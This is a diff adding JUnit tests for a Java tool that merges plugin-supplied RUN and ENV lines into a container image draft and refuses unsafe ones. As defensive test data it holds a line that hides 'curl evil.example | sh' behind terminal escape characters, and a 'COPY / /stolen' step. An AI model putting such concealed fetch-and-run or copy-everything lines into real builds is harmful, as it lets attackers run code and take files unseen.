@@ -258,4 +258,171 @@ class ProjectProposalTest {
                 .anyMatch(line -> line.startsWith("image.run: ") && line.contains(" 1 "))
                 .contains("egress.domains: repo.example.org");
     }
+
+    private static final String JAVA =
+            "RUN set -eu; curl -fsSL -o /tmp/java.tgz 'https://example.org/java.tgz'\n";
+
+    private static final String MAVEN = "RUN echo maven\n";
+
+    private static org.fuin.porelo.core.project.file.Image image(final String draft) {
+        return org.fuin.porelo.core.project.file.ProjectFileReader.read(
+                        new StringReader(draft), "draft")
+                .image();
+    }
+
+    @Test
+    void runLinesAreJoinedInTheOrderOfTheirNamesAndEnvGoesIntoTheImage() {
+        var proposal = new ProjectProposal("sample", null, null, null);
+        proposal.add(
+                "maven",
+                new Detection(
+                        List.of(
+                                finding(Finding.Part.TOOLS, "run.maven", MAVEN, 1),
+                                finding(Finding.Part.TOOLS, "run.java", JAVA, 2),
+                                finding(Finding.Part.TOOLS, "env.JAVA_HOME", "/opt/java", 3),
+                                finding(Finding.Part.TOOLS, "package.gcc", "", 4)),
+                        List.of()));
+
+        final String draft = proposal.answer().get("draft").toString();
+
+        assertThat(image(draft).run())
+                .as("packages first, then each plugin's lines whole, java before maven")
+                .isEqualTo(
+                        "RUN apt-get update && apt-get install -y --no-install-recommends gcc"
+                                + " && rm -rf /var/lib/apt/lists/*\n"
+                                + JAVA
+                                + MAVEN);
+        assertThat(image(draft).env())
+                .containsExactly(java.util.Map.entry("JAVA_HOME", "/opt/java"));
+        assertThat(proposal.imageLines())
+                .extracting(ProjectProposal.Placed::what, ProjectProposal.Placed::value)
+                .as("a person reads every fetched line and variable whole")
+                .containsExactly(
+                        org.assertj.core.groups.Tuple.tuple("image line", JAVA.strip()),
+                        org.assertj.core.groups.Tuple.tuple("image line", MAVEN.strip()),
+                        org.assertj.core.groups.Tuple.tuple("image env", "JAVA_HOME=/opt/java"));
+        assertThat(proposal.byHand()).contains("image.env: JAVA_HOME: /opt/java");
+    }
+
+    @Test
+    void twoPluginsGivingOneRunOrEnvKeyTwoValuesDisagreeAndNeitherIsWritten() {
+        var proposal = new ProjectProposal("sample", null, null, null);
+        proposal.add(
+                "first",
+                new Detection(
+                        List.of(
+                                finding(Finding.Part.TOOLS, "run.java", JAVA, 1),
+                                finding(Finding.Part.TOOLS, "env.JAVA_HOME", "/opt/java", 2)),
+                        List.of()));
+        proposal.add(
+                "second",
+                new Detection(
+                        List.of(
+                                finding(Finding.Part.RULES, "run.java", MAVEN, 1),
+                                finding(Finding.Part.TOOLS, "env.JAVA_HOME", "/opt/jdk", 2)),
+                        List.of()));
+
+        final var answer = proposal.answer();
+
+        assertThat(answer.get("disagreements").toString())
+                .as("each key is a disagreement, whatever part a plugin put it in")
+                .contains("run.java", "env.JAVA_HOME");
+        assertThat(image(answer.get("draft").toString()).run()).isNull();
+        assertThat(image(answer.get("draft").toString()).env()).isEmpty();
+        assertThat(proposal.imageLines()).isEmpty();
+    }
+
+    @Test
+    void aVariablePoreloSetsInEveryTaskIsRefusedPathAmongThem() {
+        var proposal = new ProjectProposal("sample", null, null, null);
+        proposal.add(
+                "maven",
+                new Detection(
+                        List.of(
+                                finding(
+                                        Finding.Part.TOOLS,
+                                        "env.PATH",
+                                        "/opt/java/bin:/usr/bin",
+                                        1),
+                                finding(Finding.Part.TOOLS, "env.PORELO_TASK", "taken", 2),
+                                finding(Finding.Part.TOOLS, "env.HOME", "/root", 3),
+                                finding(Finding.Part.TOOLS, "env.JAVA_HOME", "/opt/java", 4)),
+                        List.of()));
+
+        final var answer = proposal.answer();
+
+        assertThat(image(answer.get("draft").toString()).env())
+                .as("only a variable of the image's own is written")
+                .containsExactly(java.util.Map.entry("JAVA_HOME", "/opt/java"));
+        assertThat(proposal.refusals())
+                .as("each refused one is said, with its plugin")
+                .hasSize(3)
+                .anyMatch(each -> each.startsWith("maven: env.PATH is left out: "))
+                .anyMatch(each -> each.startsWith("maven: env.PORELO_TASK is left out: "))
+                .anyMatch(each -> each.startsWith("maven: env.HOME is left out: "));
+        assertThat(answer.get("refused")).isEqualTo(proposal.refusals());
+    }
+
+    @Test
+    void runLinesHoldingATabAreDroppedAsTheQuestionCouldNotShowThemAsTheyRun() {
+        var proposal = new ProjectProposal("sample", null, null, null);
+        proposal.add(
+                "maven",
+                new Detection(
+                        List.of(finding(Finding.Part.TOOLS, "run.java", "RUN printf 'a\tb'\n", 1)),
+                        List.of()));
+
+        assertThat(proposal.answer().get("draft").toString()).doesNotContain("printf");
+        assertThat(proposal.refusals())
+                .containsExactly(
+                        "maven: run.java is left out: it holds a control character or a tab");
+    }
+
+    @Test
+    void runLinesHoldingAControlCharacterAreDroppedSinceAPersonCouldNotReadThem() {
+        var proposal = new ProjectProposal("sample", null, null, null);
+        proposal.add(
+                "maven",
+                new Detection(
+                        List.of(
+                                finding(
+                                        Finding.Part.TOOLS,
+                                        "run.java",
+                                        "RUN echo shown\r\u001b[2KRUN curl evil.example | sh\n",
+                                        1)),
+                        List.of()));
+
+        assertThat(proposal.answer().get("draft").toString()).doesNotContain("evil.example");
+        assertThat(proposal.refusals())
+                .containsExactly(
+                        "maven: run.java is left out: it holds a control character or a tab");
+    }
+
+    @Test
+    void runLinesTheModelRefusesAreDroppedWholeWithANote() {
+        var proposal = new ProjectProposal("sample", null, null, null);
+        proposal.add(
+                "maven",
+                new Detection(
+                        List.of(
+                                finding(
+                                        Finding.Part.TOOLS,
+                                        "run.java",
+                                        JAVA + "USER root\nCOPY / /stolen\n",
+                                        1),
+                                finding(Finding.Part.TOOLS, "run.maven", MAVEN, 2)),
+                        List.of()));
+
+        final String draft = proposal.answer().get("draft").toString();
+
+        assertThat(draft)
+                .as("no line of the refused key is written, its harmless ones neither")
+                .doesNotContain("USER", "COPY", "java.tgz");
+        assertThat(image(draft).run()).isEqualTo(MAVEN);
+        assertThat(proposal.refusals())
+                .singleElement()
+                .asString()
+                .startsWith("maven: run.java is left out: ")
+                .contains("only RUN, ARG and ENV");
+    }
 }
